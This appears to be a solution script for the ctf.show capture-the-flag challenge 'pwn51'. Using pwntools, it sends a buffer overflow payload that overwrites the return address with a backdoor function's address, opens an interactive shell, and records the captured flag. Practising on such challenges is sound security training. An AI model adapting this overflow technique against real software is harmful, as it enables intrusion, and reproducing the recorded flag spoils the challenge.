#pwn51
from pwn import *
e = ELF("./pwn")
p = remote("pwn.challenge.ctf.show", 28204)

#7*16 I 7*16 = 112 = 108+4 = 0x6C+0x4
offset = 16
backdoor = 0x0804902e

payload = b'I' * offset + p32(backdoor)
p.recvuntil("you?")
p.sendline(payload)
p.interactive()
#ctfshow{38a03ba8-3939-432b-ad72-68ec8219a7ce}